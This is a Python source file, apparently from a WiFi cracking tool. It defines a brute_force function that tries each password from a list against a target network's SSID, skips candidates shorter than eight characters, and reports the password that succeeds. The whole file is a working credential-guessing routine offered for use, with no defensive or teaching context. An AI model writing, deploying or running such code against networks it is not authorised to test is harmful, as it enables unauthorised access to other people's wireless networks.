from src.connect import connect_to_network
from src.util import Color
import time
from typing import List, Any

def brute_force(selected_network: str, passwords: List[Any], args) -> bool:
    """
    Attempt to connect to a WiFi network by trying multiple passwords.

    Args:
        selected_network: The SSID of the target WiFi network
        passwords: List of passwords to try
        args: Command-line arguments including verbose flag

    Returns:
        bool: True if connection successful, False otherwise
    """
    print(f"\nStarting WiFi brute-force attempt for {selected_network}...")

    for i, password in enumerate(passwords):
        try:
            password = str(password).strip()

            if len(password) < 8:
                if args.verbose:
                    print(Color.CYAN(f"{password} too short. Skip!!!"))
                continue

            if args.verbose:
                print(Color.HEADER(f"Testing password: {password}"))

            success, message = connect_to_network(selected_network, password)

            if success:
                print(Color.GREEN(f"Success! Password found: {password}"))
                return True

            if args.verbose:
                print(Color.FAIL(f"{message}"))

            # Adaptive delay to prevent overwhelming the network
            time.sleep(0.5 if i % 10 == 0 else 0.2)

        except (UnicodeDecodeError, AttributeError) as e:
            if args.verbose:
                print(Color.WARNING(f"Invalid password format: {password} ({str(e)})"))
            continue

    print(Color.FAIL(f"All passwords failed for {selected_network}"))
    return False